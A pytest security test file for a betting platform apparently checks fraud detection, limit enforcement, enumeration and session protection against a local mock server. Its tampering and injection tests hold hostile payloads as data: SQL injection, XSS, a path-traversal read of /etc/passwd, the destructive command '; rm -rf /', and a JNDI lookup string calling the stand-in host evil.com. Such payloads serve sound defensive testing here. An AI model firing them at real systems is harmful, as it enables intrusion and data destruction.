import pytest
import requests
import time
from datetime import datetime, timedelta
import logging
from faker import Faker

fake = Faker()
logger = logging.getLogger(__name__)

@pytest.mark.security
@pytest.mark.fraud_detection
class TestFraudDetection:
    """Test fraud detection and prevention mechanisms"""
    
    def test_suspicious_betting_pattern_detection(self, api_client, fraud_scenarios):
        """
        Test detection of suspicious betting patterns
        """
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Reset user limits for clean test
        requests.post("http://localhost:5000/admin/reset_limits", 
                     json={"username": "testuser"})
        
        # Create suspicious betting pattern - rapid high-value bets
        suspicious_bets = fraud_scenarios["excessive_betting"]["bets"]
        
        bet_results = []
        for i, bet_info in enumerate(suspicious_bets):
            bet_data = {
                "match_id": i % 3 + 1,
                "bet_type": "home_win",
                "amount": bet_info["amount"],
                "odds": 2.0
            }
            
            start_time = time.time()
            response = api_client.place_bet(bet_data)
            response_time = time.time() - start_time
            
            result = {
                "bet_number": i + 1,
                "amount": bet_info["amount"],
                "response_time": response_time,
                "status_code": response.status_code,
                "response_data": response.json()
            }
            bet_results.append(result)
            
            logger.info(f"Suspicious bet {i+1}: {bet_info['amount']} - Status: {response.status_code}")
            
            # Very short delay to create rapid pattern
            time.sleep(0.1)
        
        # Check fraud detection
        fraud_response = requests.post("http://localhost:5000/fraud_check",
                                     headers={"Authorization": f"Bearer {api_client.token}"},
                                     json={})
        
        assert fraud_response.status_code == 200
        fraud_data = fraud_response.json()
        
        # Should detect suspicious pattern
        assert fraud_data["risk_level"] in ["medium", "high"], \
            f"Suspicious betting should trigger medium/high risk: {fraud_data}"
        
        # Should have fraud indicators
        indicators = fraud_data["fraud_indicators"]
        assert len(indicators) > 0, "Fraud indicators should be detected"
        
        # Should recommend monitoring or blocking
        assert fraud_data["recommendation"] in ["monitor", "block"], \
            "Should recommend monitoring or blocking for suspicious activity"
        
        logger.info(f"✓ Fraud detection working: {fraud_data['risk_level']} risk, "
                   f"indicators: {indicators}")
    
    def test_limit_bypass_attempt_detection(self, api_client, fraud_scenarios):
        """
        Test detection of attempts to bypass betting limits
        """
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Reset limits
        requests.post("http://localhost:5000/admin/reset_limits", 
                     json={"username": "testuser"})
        
        # Attempt to bypass daily limit with multiple smaller bets
        bypass_scenario = fraud_scenarios["limit_bypass"]
        split_bets = bypass_scenario["split_bets"]
        
        successful_bets = 0
        total_amount = 0
        limit_hit = False
        
        for i, amount in enumerate(split_bets):
            bet_data = {
                "match_id": (i % 3) + 1,
                "bet_type": ["home_win", "draw", "away_win"][i % 3],
                "amount": amount,
                "odds": 2.0
            }
            
            response = api_client.place_bet(bet_data)
            
            if response.status_code == 200:
                successful_bets += 1
                total_amount += amount
                logger.info(f"Bet {i+1} successful: {amount}, total: {total_amount}")
            else:
                # Should be blocked when approaching/exceeding limit
                error_data = response.json()
                if "daily" in error_data.get("error", "").lower():
                    limit_hit = True
                    logger.info(f"Daily limit hit after {total_amount} total betting")
                    break
            
            time.sleep(0.2)
        
        # Verify limit enforcement
        if total_amount > 5000:  # Daily limit from mock server
            assert limit_hit, "Daily limit should have been enforced"
        
        # Check final fraud assessment
        fraud_response = requests.post("http://localhost:5000/fraud_check",
                                     headers={"Authorization": f"Bearer {api_client.token}"},
                                     json={})
        
        fraud_data = fraud_response.json()
        logger.info(f"Limit bypass attempt fraud assessment: {fraud_data}")
        
        # Should detect the bypass attempt pattern
        if total_amount > 3000:  # Significant betting
            assert fraud_data["risk_level"] != "low", \
                "High volume betting should increase risk level"
    
    def test_rapid_account_activity_detection(self, api_client):
        """
        Test detection of rapid account activity across multiple functions
        """
        # Login
        login_response = api_client.login("verified_user", "password123")
        assert login_response.status_code == 200
        
        activities = []
        
        # Rapid sequence of different activities
        activity_sequence = [
            ("profile_update", {"first_name": fake.first_name()}),
            ("bet_placement", {"match_id": 1, "bet_type": "home_win", "amount": 100, "odds": 2.0}),
            ("profile_update", {"last_name": fake.last_name()}),
            ("bet_placement", {"match_id": 2, "bet_type": "draw", "amount": 150, "odds": 3.0}),
            ("limits_check", {}),
            ("bet_placement", {"match_id": 3, "bet_type": "away_win", "amount": 200, "odds": 1.8}),
            ("profile_update", {"address": fake.address()})
        ]
        
        for activity_type, data in activity_sequence:
            start_time = time.time()
            
            if activity_type == "profile_update":
                response = api_client.update_profile(data)
            elif activity_type == "bet_placement":
                response = api_client.place_bet(data)
            elif activity_type == "limits_check":
                response = api_client.get_user_limits()
            
            activity_time = time.time() - start_time
            
            activity_result = {
                "type": activity_type,
                "response_time": activity_time,
                "status_code": response.status_code,
                "data": data
            }
            
            activities.append(activity_result)
            logger.info(f"Activity {activity_type}: {response.status_code} in {activity_time:.3f}s")
            
            # Check if rate limiting kicks in
            if response.status_code == 429:
                logger.info(f"Rate limiting detected on {activity_type}")
                break
            
            time.sleep(0.1)  # Rapid activity
        
        # Analyze activity pattern
        total_activities = len(activities)
        successful_activities = sum(1 for a in activities if a["status_code"] in [200, 201])
        rate_limited_activities = sum(1 for a in activities if a["status_code"] == 429)
        
        logger.info(f"Rapid activity test: {successful_activities}/{total_activities} successful, "
                   f"{rate_limited_activities} rate limited")
        
        # Should handle rapid activity appropriately
        assert total_activities > 0, "Should process some activities"
    
    def test_account_enumeration_protection(self, api_client):
        """
        Test protection against account enumeration attacks
        """
        # Test login timing attack resistance
        valid_username = "testuser"
        invalid_usernames = ["nonexistent1", "fake_user", "admin123", "user_doesnt_exist"]
        
        timing_results = []
        
        # Test valid username with wrong password
        start_time = time.time()
        response = api_client.login(valid_username, "wrong_password")
        valid_user_time = time.time() - start_time
        
        timing_results.append({
            "username": valid_username,
            "exists": True,
            "response_time": valid_user_time,
            "status_code": response.status_code
        })
        
        # Test invalid usernames
        for username in invalid_usernames:
            start_time = time.time()
            response = api_client.login(username, "wrong_password")
            response_time = time.time() - start_time
            
            timing_results.append({
                "username": username,
                "exists": False,
                "response_time": response_time,
                "status_code": response.status_code
            })
            
            time.sleep(0.1)
        
        # Analyze timing differences
        valid_times = [r["response_time"] for r in timing_results if r["exists"]]
        invalid_times = [r["response_time"] for r in timing_results if not r["exists"]]
        
        if valid_times and invalid_times:
            avg_valid_time = sum(valid_times) / len(valid_times)
            avg_invalid_time = sum(invalid_times) / len(invalid_times)
            time_difference = abs(avg_valid_time - avg_invalid_time)
            
            logger.info(f"Timing analysis: Valid user avg {avg_valid_time:.3f}s, "
                       f"Invalid user avg {avg_invalid_time:.3f}s, diff {time_difference:.3f}s")
            
            # Large timing differences could indicate enumeration vulnerability
            if time_difference > 0.5:  # 500ms difference
                logger.warning("Potential timing-based enumeration vulnerability detected")
        
        # All login attempts should return similar error responses
        error_messages = set()
        for result in timing_results:
            if result["status_code"] == 401:
                # In a real test, you'd check the actual error message
                error_messages.add("generic_error")
        
        # Should use consistent error messages
        assert len(error_messages) <= 1, "Should use consistent error messages to prevent enumeration"
        
        logger.info("✓ Account enumeration protection validated")
    
    def test_session_hijacking_protection(self, api_client):
        """
        Test protection against session hijacking
        """
        # Login normally
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        valid_token = api_client.token
        
        # Test token manipulation
        manipulated_tokens = [
            valid_token[:-5] + "XXXXX",  # Modified token
            valid_token + "extra",        # Extended token
            valid_token[:-10],           # Truncated token
            "fake_token_12345",          # Completely fake token
            "",                          # Empty token
        ]
        
        for fake_token in manipulated_tokens:
            # Create client with manipulated token
            fake_client = type(api_client)()
            fake_client.token = fake_token
            fake_client.session.headers.update({"Authorization": f"Bearer {fake_token}"})
            
            # Try to access protected endpoint
            response = fake_client.get_user_limits()
            
            # Should be rejected
            assert response.status_code == 401, \
                f"Manipulated token should be rejected: {fake_token[:20]}..."
            
            logger.info(f"Manipulated token rejected: {fake_token[:20]}...")
        
        # Original token should still work
        original_response = api_client.get_user_limits()
        assert original_response.status_code == 200, "Original token should still work"
        
        logger.info("✓ Session hijacking protection validated")
    
    def test_data_integrity_validation(self, api_client):
        """
        Test data integrity validation and tampering detection
        """
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Test bet data tampering
        valid_bet_data = {
            "match_id": 1,
            "bet_type": "home_win",
            "amount": 100,
            "odds": 2.0
        }
        
        # Tampered bet data
        tampered_scenarios = [
            {**valid_bet_data, "amount": -100},  # Negative amount
            {**valid_bet_data, "odds": -1.5},   # Negative odds
            {**valid_bet_data, "match_id": "'; DROP TABLE matches; --"},  # SQL injection
            {**valid_bet_data, "bet_type": "<script>alert('xss')</script>"},  # XSS
            {**valid_bet_data, "amount": 999999999},  # Extremely large amount
            {"extra_field": "malicious", **valid_bet_data},  # Extra fields
        ]
        
        for i, tampered_data in enumerate(tampered_scenarios):
            response = api_client.place_bet(tampered_data)
            
            # Should either reject malicious data or sanitize it
            if "amount" in tampered_data and tampered_data["amount"] < 0:
                assert response.status_code == 400, "Negative amounts should be rejected"
            elif "odds" in tampered_data and tampered_data["odds"] < 0:
                assert response.status_code == 400, "Negative odds should be rejected"
            elif tampered_data.get("amount", 0) > 1000000:
                assert response.status_code == 400, "Extremely large amounts should be rejected"
            
            logger.info(f"Tampered data test {i+1}: {response.status_code}")
        
        logger.info("✓ Data integrity validation completed")
    
    def test_concurrent_fraud_attempts(self, api_client):
        """
        Test fraud detection under concurrent access
        """
        import threading
        import queue
        
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Reset limits
        requests.post("http://localhost:5000/admin/reset_limits", 
                     json={"username": "testuser"})
        
        results = queue.Queue()
        
        def concurrent_betting():
            """Concurrent betting function"""
            try:
                bet_data = {
                    "match_id": 1,
                    "bet_type": "home_win",
                    "amount": 800,  # High amount
                    "odds": 2.0
                }
                
                response = api_client.place_bet(bet_data)
                results.put({
                    "status_code": response.status_code,
                    "response": response.json(),
                    "thread_id": threading.current_thread().ident
                })
                
            except Exception as e:
                results.put({
                    "error": str(e),
                    "thread_id": threading.current_thread().ident
                })
        
        # Start multiple concurrent betting attempts
        threads = []
        concurrent_attempts = 5
        
        for _ in range(concurrent_attempts):
            thread = threading.Thread(target=concurrent_betting)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        # Collect results
        concurrent_results = []
        while not results.empty():
            concurrent_results.append(results.get())
        
        # Analyze concurrent behavior
        successful_bets = [r for r in concurrent_results if r.get("status_code") == 200]
        failed_bets = [r for r in concurrent_results if r.get("status_code") != 200]
        
        logger.info(f"Concurrent fraud test: {len(successful_bets)} successful, "
                   f"{len(failed_bets)} failed out of {len(concurrent_results)} total")
        
        # Should handle concurrent requests appropriately
        assert len(concurrent_results) == concurrent_attempts, \
            "Should process all concurrent requests"
        
        # Check for race condition issues
        total_successful_amount = len(successful_bets) * 800
        if total_successful_amount > 5000:  # Daily limit
            logger.warning("Potential race condition: concurrent bets exceeded daily limit")
    
    @pytest.mark.parametrize("attack_type,payload", [
        ("xss", "<script>alert('fraud')</script>"),
        ("sql_injection", "'; INSERT INTO bets VALUES (999, 'fake'); --"),
        ("path_traversal", "../../../etc/passwd"),
        ("command_injection", "; rm -rf /"),
        ("template_injection", "{{7*7}}"),
        ("ldap_injection", "${jndi:ldap://evil.com/fraud}")
    ])
    def test_injection_attack_prevention(self, api_client, attack_type, payload):
        """
        Test prevention of various injection attacks in fraud context
        """
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Test injection in bet data
        malicious_bet_data = {
            "match_id": payload,
            "bet_type": payload,
            "amount": 100,
            "odds": 2.0
        }
        
        response = api_client.place_bet(malicious_bet_data)
        
        # Should not process malicious data successfully
        if response.status_code == 200:
            # If processed, verify no injection occurred
            logger.warning(f"{attack_type} payload may have been processed: {payload[:30]}...")
        else:
            # Rejection is expected for malicious input
            logger.info(f"✓ {attack_type} attack prevented: {response.status_code}")
        
        # Test injection in profile update
        if api_client.token:  # Ensure still logged in
            malicious_profile_data = {"first_name": payload}
            profile_response = api_client.update_profile(malicious_profile_data)
            
            if profile_response.status_code == 200:
                logger.info(f"{attack_type} in profile may need verification")
            else:
                logger.info(f"✓ {attack_type} in profile prevented: {profile_response.status_code}")
        
        # Verify system integrity after attack attempt
        limits_response = api_client.get_user_limits()
        assert limits_response.status_code == 200, \
            f"System should remain functional after {attack_type} attack"